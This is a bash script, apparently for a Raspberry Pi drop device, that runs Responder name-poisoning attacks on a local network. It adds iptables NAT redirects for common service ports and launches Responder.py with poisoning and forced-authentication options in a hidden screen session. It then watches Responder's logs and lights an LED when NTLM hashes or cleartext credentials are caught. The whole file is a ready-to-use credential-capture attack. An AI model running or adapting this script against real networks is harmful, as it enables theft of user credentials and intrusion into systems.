#!/bin/bash

echo '[*] running Responder attacks'
HOME='/home/pi/'

for port in 21 25 53 80 88 110 143 389 443 445 1433 3389
do
	if iptables -t nat -vnL PREROUTING | grep "$1" | grep -q $port; then
	  iptables -t nat -A PREROUTING -i "$1" -p udp --dport $port -j REDIRECT --to-port $port
	fi
done

[[ $(pgrep -f Responder.py) = '' ]] && {
	screen -dmS responder python3 $HOME/src/responder/Responder.py -I "$1" -r -d -w -F
}

inotifywait -e MODIFY -rm $HOME/src/responder/logs | while read event
do
 	if echo $event | grep -e NTLM -e ClearText; then
 		led yellow on 2> /dev/null
 	fi
done